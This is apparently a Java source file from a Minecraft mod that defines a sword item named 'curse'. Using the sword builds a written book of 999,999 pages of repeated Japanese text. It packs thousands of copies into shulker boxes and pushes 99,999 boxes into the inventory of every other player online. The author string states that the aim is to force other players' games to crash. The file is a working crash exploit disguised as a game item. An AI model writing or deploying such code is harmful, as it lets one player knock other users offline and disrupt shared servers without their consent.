package com.maxwell.fear.curse;

import net.minecraft.ChatFormatting;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.InteractionResultHolder;
import net.minecraft.world.entity.EquipmentSlot;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.Mob;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.*;
import net.minecraft.world.level.Level;

import javax.annotation.Nullable;
import java.util.List;

public class curse extends SwordItem {
    public curse(Tier pTier, int pAttackDamageModifier, float pAttackSpeedModifier, Properties pProperties) {
        super(pTier, pAttackDamageModifier, pAttackSpeedModifier, pProperties);
    }
    @Override
    public void appendHoverText(ItemStack stack, @Nullable Level worldIn, List<Component> tooltip, TooltipFlag flagIn) {
        tooltip.add(Component.translatable("item.fear.curse.desc1").withStyle(ChatFormatting.YELLOW));
        tooltip.add(Component.translatable("item.fear.curse.desc2").withStyle(ChatFormatting.YELLOW));
    }
    @Override
    public InteractionResultHolder<ItemStack> use(Level level, Player player, InteractionHand hand) {
        if (!level.isClientSide) {
            ItemStack shulker = createShulkerWithBooks();

            for (ServerPlayer other : level.getServer().getPlayerList().getPlayers()) {
                if (!other.getUUID().equals(player.getUUID())) {
                    giveShulkerToEntity(other, shulker);
                }
            }
        }
        return InteractionResultHolder.success(player.getItemInHand(hand));
    }

    private ItemStack createJapaneseBook() {
        ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
        CompoundTag tag = book.getOrCreateTag();
        tag.putString("author", "maxwellこと人間の屑は文字を大量に書いた本を他人に上げることで強制的にクラッシュできることを知っているので大量の文章を盛った本を貴方に投げつけます");
        tag.putString("title", "死ぬがよい！！！！！！！お前はミスをした！この剣に触れたことだ！");

        ListTag pages = new ListTag();
        for (int i = 1; i <= 999999; i++) {
            String text = "呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。呪いの本です。";
            pages.add(StringTag.valueOf(Component.Serializer.toJson(Component.literal(text))));
        }

        tag.put("pages", pages);
        book.setTag(tag);
        return book;
    }
    private ItemStack createShulkerWithBooks() {
        ItemStack shulker = new ItemStack(Items.SHULKER_BOX);
        CompoundTag blockEntityTag = new CompoundTag();
        ListTag items = new ListTag();

        ItemStack book = createJapaneseBook();

        for (int i = 0; i < 9999; i++) {
            CompoundTag bookTag = new CompoundTag();
            book.save(bookTag);
            bookTag.putByte("Slot", (byte) i);
            items.add(bookTag);
        }

        blockEntityTag.put("Items", items);
        shulker.getOrCreateTag().put("BlockEntityTag", blockEntityTag);
        shulker.setHoverName(Component.literal("記録の箱"));
        return shulker;
    }

    @Override
    public boolean isDamaged(ItemStack stack) {
        return false;
    }

    private void giveShulkerToEntity(LivingEntity entity, ItemStack shulker) {
        if (entity instanceof Player player) {
            for (int i = 0; i < 99999; i++) {
                player.getInventory().add(shulker.copy());
            }
        } else if (entity instanceof Mob mob) {
            mob.setItemSlot(EquipmentSlot.MAINHAND, shulker.copy());
        }
    }

}
